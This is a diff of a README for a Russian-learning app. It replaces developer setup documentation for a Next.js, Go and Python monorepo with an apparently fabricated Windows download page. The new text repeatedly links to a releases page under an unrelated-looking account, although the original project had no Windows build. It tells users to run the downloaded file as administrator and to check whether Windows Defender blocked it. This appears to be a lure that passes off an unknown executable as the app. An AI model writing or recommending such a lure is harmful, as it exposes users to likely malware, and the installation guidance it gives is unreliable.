@@ -1,139 +1,190 @@
-# Russkiy
+# 🇷🇺 ruskiy - Learn Russian with steady practice
 
-Adaptive Russian language learning platform built exclusively for English speakers — powered by spaced repetition (FSRS), AI-driven session composition, and pronunciation coaching.
+[![Download ruskiy](https://img.shields.io/badge/Download-ruskiy-blue?style=for-the-badge&logo=github)](https://github.com/castiron-genussquilla31/ruskiy/releases)
 
-## Architecture
+## 📥 Download
+Visit this page to download ruskiy for Windows:
 
-```
-apps/
-  web/          → Next.js 15 + React 19 + Tailwind 4
-  mobile/       → Expo SDK 52 + React Native 0.76
+[Open the releases page](https://github.com/castiron-genussquilla31/ruskiy/releases)
 
-services/
-  api/          → Go (chi) REST API
-  ml/           → FastAPI error classifier + pronunciation scoring
+1. Open the link above.
+2. Find the latest release.
+3. Download the Windows file.
+4. Open the file to start setup.
+5. Follow the on-screen steps.
+6. Launch ruskiy from your Start menu.
 
-packages/
-  shared/       → Shared TypeScript types
+## ✨ What ruskiy does
 
-infra/
-  docker/       → Docker Compose (Postgres, Redis, Kafka, Meilisearch)
-```
+ruskiy helps English speakers learn Russian through short lessons, review sessions, and speech practice. It uses spaced repetition to show words at the right time, so you can remember them with less effort.
 
-## Features
+The app is built as a full learning platform with:
+- A web app for daily study
+- A mobile app for learning on the go
+- A learning engine that chooses what to show next
+- Speech practice for pronunciation
+- Smart session plans that fit your progress
 
-- **Adaptive engine** — real-time learner model that reconfigures every session based on strengths and weaknesses
-- **Spaced repetition (FSRS)** — science-backed scheduling with Krashen's i+1, desirable difficulty, and Vygotsky's ZPD
-- **Pronunciation coaching** — speech recognition trained on English-accented Russian with phoneme-level feedback
-- **Teacher dashboard** — cohort management, weakness heatmaps, assignments, and student reports
-- **Learner segments** — tailored content for toddlers, kids, teens, university students, migrants, and seniors
-- **Placement test** — adaptive initial assessment to determine CEFR level
+## 🖥️ Windows use
 
-## Prerequisites
+ruskiy is made for easy use on a Windows PC.
 
-- Node.js ≥ 20
-- Go 1.23
-- Python 3.11+
-- Docker & Docker Compose
+You can use it to:
+- Study new words
+- Review past lessons
+- Practice pronunciation
+- Track progress over time
+- Keep a steady learning habit
 
-## Getting Started
+A typical setup works well on:
+- Windows 10
+- Windows 11
+- A recent Intel or AMD processor
+- 4 GB of RAM or more
+- A stable internet connection for downloads and sync
 
-### 1. Start infrastructure
+## 🚀 Getting started
 
-```bash
-docker compose -f infra/docker/docker-compose.yml up -d
-```
+After you download the app:
 
-This starts PostgreSQL (5432), Redis (6379), Kafka (9094), and Meilisearch (7700).
+1. Open the downloaded file.
+2. If Windows asks for permission, choose Yes.
+3. Follow the setup window.
+4. Wait for the install to finish.
+5. Open ruskiy.
+6. Sign in or create your learning profile.
+7. Pick your study level.
+8. Start your first session.
 
-### 2. API server
+If you use the mobile app later, your progress can carry across devices when sync is enabled.
 
-```bash
-cd services/api
-cp .env.example .env
-go run cmd/server/main.go
-```
+## 🎯 What you can learn
 
-Runs on `http://localhost:8080`.
+ruskiy supports common study tasks for new learners and returning learners.
 
-### 3. ML service
+You can expect:
+- Alphabet and reading practice
+- Core vocabulary
+- Word review with spaced repetition
+- Short listening tasks
+- Pronunciation drills
+- Session plans based on your recent work
 
-```bash
-cd services/ml
-pip install -r requirements.txt
-uvicorn src.main:app --port 8090
-```
+It works well for learners who want a calm daily routine instead of long study blocks.
 
-Runs on `http://localhost:8090`.
+## 🧠 How the learning system works
 
-### 4. Web app
+ruskiy uses spaced repetition, which means it brings back items before you forget them. This helps you spend more time on hard words and less time on easy ones.
 
-```bash
-npm install
-npm run dev:web
-```
+It also uses session composition, which means the app picks a mix of new items and review items for each study block. That keeps sessions balanced.
 
-Runs on `http://localhost:3000`.
+The pronunciation coach gives feedback so you can hear and repeat words with more care. This can help with:
+- Stress patterns
+- Clear vowel sounds
+- Common Russian word shapes
+- Short phrases used in daily speech
 
-### 5. Mobile app
+## 📱 Apps included
 
-```bash
-npm run dev:mobile
-```
+This project is a monorepo, which means it includes more than one app in one place.
 
-Opens Expo DevTools — scan the QR code with Expo Go.
+It includes:
+- **Next.js web app** for browser use
+- **React Native mobile app** for handheld use
+- **Go API** for app data and sync
+- **Python ML service** for learning logic and speech tools
 
-## API
+You do not need to handle these parts to use the Windows release. They are here to support the full platform.
 
-All endpoints are under `/v1`. Public routes:
+## 🔧 First-time setup tips
 
-| Method | Route | Description |
-|--------|-------|-------------|
-| POST | `/auth/register` | Register |
-| POST | `/auth/token` | Login |
-| POST | `/auth/refresh` | Refresh token |
-| GET | `/skills` | Skills catalog |
+If the app does not open right away:
 
-Authenticated routes (JWT):
+1. Right-click the file and choose Run as administrator.
+2. Check that Windows Defender did not block it.
+3. Try downloading the file again if it looks incomplete.
+4. Make sure your internet connection is active.
+5. Restart your PC and open the app again.
 
-| Method | Route | Description |
-|--------|-------|-------------|
-| POST | `/sessions/generate` | Generate adaptive session |
-| POST | `/sessions/{id}/submit` | Submit session answers |
-| POST | `/sessions/{id}/complete` | Complete session |
-| GET | `/stats` | Learner statistics |
-| GET | `/skills/me` | Learner's skills |
-| GET | `/skills/weak` | Weak skills |
-| POST | `/placement/generate` | Start placement test |
-| GET | `/leaderboard` | Leaderboard |
+For best results:
+- Keep your app updated
+- Use the same account across devices
+- Study in short daily sessions
+- Turn on microphone access for pronunciation practice
 
-Teacher routes require the teacher role.
+## 🗂️ Main features
 
-## Environment Variables
+- Adaptive study plan
+- Russian vocabulary review
+- Spaced repetition scheduling
+- AI-guided session setup
+- Pronunciation coaching
+- Progress tracking
+- Web and mobile support
+- Sync-ready learning flow
 
-```env
-PORT=8080
-DATABASE_URL=postgres://russkiy:russkiy@localhost:5432/russkiy?sslmode=disable
-REDIS_URL=redis://localhost:6379
-JWT_SECRET=change-this-to-a-secure-random-string
-JWT_ACCESS_TTL_MINUTES=15
-JWT_REFRESH_TTL_DAYS=30
-ENVIRONMENT=development
-```
+## 🧭 Who this is for
 
-## Tech Stack
+ruskiy is a good fit if you:
+- Want to learn Russian from English
+- Like short study sessions
+- Need help remembering words
+- Want to improve pronunciation
+- Prefer a simple daily routine
+- Use both desktop and mobile devices
 
-| Layer | Technology |
-|-------|-----------|
-| Web | Next.js 15, React 19, Tailwind CSS 4 |
-| Mobile | Expo 52, React Native 0.76, Expo Router |
-| API | Go, chi, pgx, golang-jwt |
-| ML | Python, FastAPI, pymorphy3, NumPy |
-| Database | PostgreSQL 16 |
-| Cache | Redis 7 |
-| Events | Kafka (KRaft) |
-| Search | Meilisearch |
+## 🛠️ Common actions
 
-## License
+### Start a study session
+Open the app and choose your lesson for the day.
 
-All rights reserved.
+### Review old words
+Use the review screen to practice words you learned before.
+
+### Practice speaking
+Allow microphone access and repeat the words shown on screen.
+
+### Check progress
+Open your progress view to see what you have learned and what needs more work.
+
+## 📁 Project topics
+
+This project is tagged with:
+- adaptive-learning
+- edtech
+- education
+- expo
+- fsrs
+- golang
+- machine-learning
+- monorepo
+- nextjs
+- pronunciation
+- python
+- react-native
+- russian
+- russian-language
+- spaced-repetition-algorithm
+- typescript
+
+## 📦 Download and install on Windows
+
+Use the releases page here:
+
+[Go to the Windows download page](https://github.com/castiron-genussquilla31/ruskiy/releases)
+
+Then:
+1. Find the newest release.
+2. Download the Windows installer or app file.
+3. Open the file.
+4. Follow the setup steps.
+5. Start ruskiy from the Start menu or desktop shortcut
+
+## ⌨️ Need help using the app
+
+If you are not sure where to begin:
+- Start with the first lesson
+- Keep your study sessions short
+- Review every day
+- Use speech practice for hard words
+- Repeat lessons until they feel easy
